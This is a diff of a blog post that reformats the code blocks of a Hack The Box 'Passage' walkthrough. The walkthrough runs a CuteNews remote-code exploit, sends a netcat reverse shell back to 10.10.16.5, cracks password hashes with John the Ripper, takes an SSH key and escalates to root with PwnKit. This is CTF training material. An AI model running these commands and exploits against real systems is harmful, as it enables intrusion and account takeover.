@@ -26,8 +26,7 @@ Let's see if we can't find the passage to the flags on Passage!
 
 Start by running nmap to identify the services.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/htb/passage]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.206
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 20:51 AEST
@@ -57,14 +56,13 @@ HOP RTT       ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 28.63 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Try running curl -I to pull the headers to try and identify some technologies.
 
-{% raw %}
-```bash
+{% capture curli %}
 ┌──(kali㉿kali)-[~/Documents/htb/passage]
 └─$ curl -I http://10.10.10.206
 HTTP/1.1 200 OK
@@ -75,8 +73,8 @@ Expires: Thu, 19 Nov 1981 08:52:00 GMT
 Cache-Control: no-store, no-cache, must-revalidate
 Pragma: no-cache
 Content-Type: text/html; charset=UTF-8
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=curli %}
 
 <br />
 Check the landing page the webserver is serving.
@@ -90,8 +88,7 @@ Check the landing page the webserver is serving.
 <br />
 Try checking the source code of the web page.  We might get lucky and find something juicy.
 
-{% raw %}
-```html
+{% capture t_browser %}
 <html>
 <head>
     <title>Passage News</title>
@@ -123,8 +120,8 @@ Try checking the source code of the web page.  We might get lucky and find somet
 <snip>
 
 </html>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='view-source:http://10.10.10.206' content=t_browser %}
 
 <br />
 Check for the existence of robots.txt.
@@ -157,8 +154,7 @@ Check the exploit-db for CuteNews and our specific version.
 <br />
 Download the exploit to the local working folder.
 
-{% raw %}
-```bash
+{% capture downloadexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/passage]
 └─$ wget https://www.exploit-db.com/raw/48800 -O exploit.py  
 --2025-06-07 21:04:07--  https://www.exploit-db.com/raw/48800
@@ -171,14 +167,13 @@ Saving to: ‘exploit.py’
 exploit.py                                                 100%[========================================================================================================================================>]   5.00K  --.-KB/s    in 0s      
 
 2025-06-07 21:04:08 (124 MB/s) - ‘exploit.py’ saved [5117/5117]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadexploit %}
 
 <br />
 Run the exploit and confirm execution.
 
-{% raw %}
-```bash
+{% capture runexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/passage]
 └─$ python3 exploit.py              
 /home/kali/Documents/htb/passage/exploit.py:28: SyntaxWarning: invalid escape sequence '\_'
@@ -230,40 +225,43 @@ command > ls
 avatar_1iAdpCYI6A_1iAdpCYI6A.php
 avatar_egre55_ykxnacpt.php
 avatar_hacker_jpyoyskt.php
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runexploit %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture start443listener %}
 ┌──(kali㉿kali)-[~/Documents/htb/passage]
 └─$ sudo rlwrap nc -nlvp 443
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=start443listener %}
 
 <br />
 Save the hashes to a file.
 
-{% raw %}
-```bash
+{% capture catpassestxt %}
 ┌──(kali㉿kali)-[~/Documents/htb/passage]
-└─$ cat passes.txt              
+└─$ cat passes.txt       
+{% endcapture %}
+
+{% capture passestxt %}
 7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
 4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
 e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
 f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
 4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catpassestxt %}
+
+{% include codebox.html title="passes.txt" content=passestxt %}
 
 <br />
 Run the hashes through the john the ripper.
 
-{% raw %}
-```bash
+{% capture johncrackpasses %}
 ┌──(kali㉿kali)-[~/Documents/htb/passage]
 └─$ john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt passes.txt
 Using default input encoding: UTF-8
@@ -275,8 +273,8 @@ atlanta1         (?)
 1g 0:00:00:01 DONE (2025-06-07 21:10) 0.7751g/s 11118Kp/s 11118Kc/s 44526KC/s -sevim-..*7¡Vamos!
 Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
 Session completed.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=johncrackpasses %}
 
 <br />
 Check the rest of the hashes in crackstation.net to see if we can't get any other cracks.
@@ -301,22 +299,20 @@ Use Revshells to generate a payload.
 <br />
 Use the payload from revshells in the exploit command prompt.
 
-{% raw %}
-```bash
+{% capture runrevshells %}
 command > ls
 avatar_1iAdpCYI6A_1iAdpCYI6A.php
 avatar_egre55_ykxnacpt.php
 avatar_hacker_jpyoyskt.php
 
 command > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.5 443 >/tmp/f
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runrevshells %}
 
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchfootholdshell %}
 ┌──(kali㉿kali)-[~/Documents/htb/passage]
 └─$ sudo rlwrap nc -nlvp 443
 listening on [any] 443 ...
@@ -324,38 +320,35 @@ connect to [10.10.16.5] from (UNKNOWN) [10.10.10.206] 39494
 bash: cannot set terminal process group (1641): Inappropriate ioctl for device
 bash: no job control in this shell
 www-data@passage:/var/www/html/CuteNews/uploads$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchfootholdshell %}
 
 <br />
 Check the /home folder to see who are the users on the system.
 
-{% raw %}
-```bash
+{% capture lshome %}
 www-data@passage:/home$ ls
 ls
 nadav  paul
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=lshome %}
 
 <br />
 Su into the paul account with the atlanta1 password from the john the ripper output.
 
-{% raw %}
-```bash
+{% capture supaul %}
 www-data@passage:/home$ su paul
 su paul
 Password: atlanta1
 
 paul@passage:/home$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=supaul %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 paul@passage:~$ cat user.txt
 cat user.txt
 <redacted>
@@ -375,92 +368,84 @@ ip a
        valid_lft 86399sec preferred_lft 14399sec
     inet6 fe80::250:56ff:fe95:1bf2/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Check for the id_rsa private key.
 
-{% raw %}
-```bash
+{% capture catidrsa %}
 paul@passage:~/.ssh$ cat id_rsa
 cat id_rsa
 
 <redacted>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catidrsa %}
 
 <br />
 Transfer the private key to the attack machine and chmod the file to 600.
 
-{% raw %}
-```bash
+{% capture chmodidrsa %}
 ┌──(kali㉿kali)-[~/Documents/htb/passage]
 └─$ cat id_rsa       
 <redacted>
                                                                                                                                                                                                                                             
 ┌──(kali㉿kali)-[~/Documents/htb/passage]
 └─$ chmod 600 id_rsa
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=chmodidrsa %}
 
 <br />
 Ssh with the id_rsa file to ssh in as Paul.
 
-{% raw %}
-```bash
+{% capture sshidrsa %}
 ┌──(kali㉿kali)-[~/Documents/htb/passage]
 └─$ ssh -i id_rsa paul@10.10.10.206
 paul@passage:~$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sshidrsa %}
 
 <br />
 Run id to see more about the user.
 
-{% raw %}
-```bash
+{% capture id %}
 paul@passage:~$ id
 uid=1001(paul) gid=1001(paul) groups=1001(paul)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=id %}
 
 <br />
 Run sudo -l to list all of the commands our user can use as sudo.
 
-{% raw %}
-```bash
+{% capture sudol %}
 paul@passage:~$ sudo -l
 [sudo] password for paul: 
 Sorry, user paul may not run sudo on passage.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sudol %}
 
 <br />
 Run uname -a to get the Linux version.
 
-{% raw %}
-```bash
+{% capture unamea %}
 paul@passage:~$ uname -a
 Linux passage 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=unamea %}
 
 <br />
 View the /etc/issue to get the OS version.
 
-{% raw %}
-```bash
+{% capture catetcissue %}
 paul@passage:~$ cat /etc/issue
 Ubuntu 16.04.6 LTS \n \l
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catetcissue %}
 
 <br />
 Check to running services.
 
-{% raw %}
-```bash
+{% capture ssantlip %}
 paul@passage:~$ ss -antlp
 State      Recv-Q Send-Q                                                                         Local Address:Port                                                                                        Peer Address:Port              
 LISTEN     0      128                                                                                        *:22                                                                                                     *:*                  
@@ -468,8 +453,8 @@ LISTEN     0      5                                                             
 LISTEN     0      128                                                                                       :::80                                                                                                    :::*                  
 LISTEN     0      128                                                                                       :::22                                                                                                    :::*                  
 LISTEN     0      5                                                                                        ::1:631                                                                                                   :::* 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=ssantlip %}
 
 <br />
 So, since I noticed the fail2ban from the News front page.  So, I remembered that there was a privesc with this.  The conditions didn't appear to be vulnerable.  But that didn't stop me from spending time trying.  I am not including all of it though.
@@ -484,8 +469,7 @@ So, since I noticed the fail2ban from the News front page.  So, I remembered tha
 <br />
 Download linpeas.sh from their GitHub.
 
-{% raw %}
-```bash
+{% capture downloadpeas %}
 ┌──(kali㉿kali)-[~/Documents/htb/passage]
 └─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250601-88c7a0f6/linpeas.sh
 --2025-06-07 21:36:45--  https://github.com/peass-ng/PEASS-ng/releases/download/20250601-88c7a0f6/linpeas.sh
@@ -508,14 +492,13 @@ linpeas.sh                                                 100%[================
 ┌──(kali㉿kali)-[~/Documents/htb/passage]
 └─$ python3 -m http.server          
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadpeas %}
 
 <br />
 Transfer to the victim machine.
 
-{% raw %}
-```bash
+{% capture transferpeas %}
 paul@passage:/dev/shm$ wget 10.10.16.5:8000/linpeas.sh
 --2025-06-07 04:42:41--  http://10.10.16.5:8000/linpeas.sh
 Connecting to 10.10.16.5:8000... connected.
@@ -528,14 +511,13 @@ linpeas.sh                                                 100%[================
 2025-06-07 04:42:45 (349 KB/s) - ‘linpeas.sh’ saved [954437/954437]
 
 paul@passage:/dev/shm$ chmod +x linpeas.sh
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=transferpeas %}
 
 <br />
 Run the peas and give the results peek.
 
-{% raw %}
-```bash
+{% capture runpeas %}
 paul@passage:/dev/shm$ ./linpeas.sh 
 
 
@@ -577,8 +559,8 @@ paul@passage:/dev/shm$ ./linpeas.sh
    Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runpeas %}
 
 <br />
 Look up the PwnKit from the Linpeas because it says "Probably."
@@ -593,22 +575,20 @@ Look up the PwnKit from the Linpeas because it says "Probably."
 <br />
 Download the PwnKit to the attack machine.
 
-{% raw %}
-```bash
+{% capture curlpwnkit %}
 ┌──(kali㉿kali)-[~/Documents/htb/passage]
 └─$ curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
                                                                                                                                                                                                                                             
 ┌──(kali㉿kali)-[~/Documents/htb/passage]
 └─$ python3 -m http.server                                                        
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=curlpwnkit %}
 
 <br />
 Transfer the script to the victim machine.
 
-{% raw %}
-```bash
+{% capture transferpwnkit %}
 paul@passage:/dev/shm$ wget 10.10.16.5:8000/PwnKit
 --2025-06-07 07:06:13--  http://10.10.16.5:8000/PwnKit
 Connecting to 10.10.16.5:8000... connected.
@@ -621,36 +601,33 @@ PwnKit                                                     100%[================
 2025-06-07 07:06:14 (30.4 KB/s) - ‘PwnKit’ saved [18040/18040]
 
 paul@passage:/dev/shm$ chmod +x PwnKit
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=transferpwnkit %}
 
 <br />
 Run the exploit script.
 
-{% raw %}
-```bash
+{% capture runpwnkit %}
 paul@passage:/dev/shm$ ./PwnKit 
 root@passage:/dev/shm# egre55
 egre55: command not found
 root@passage:/dev/shm#
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runpwnkit %}
 
 <br />
 Execute some commands to confirm command execution.
 
-{% raw %}
-```bash
+{% capture confirmroot %}
 root@passage:/dev/shm# id
 uid=0(root) gid=0(root) groups=0(root),1001(paul)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=confirmroot %}
 
 <br />
 Be sure to snag the root.txt file.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 root@passage:/dev/shm# cat /root/root.txt
 <snip>
 root@passage:/dev/shm# ip a
@@ -668,8 +645,8 @@ root@passage:/dev/shm# ip a
        valid_lft 86397sec preferred_lft 14397sec
     inet6 fe80::250:56ff:fe95:1bf2/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 And with that, we successfully faced the flames at the end of the Passage.  Hopefully you enjoyed the read.  See you in the next one!
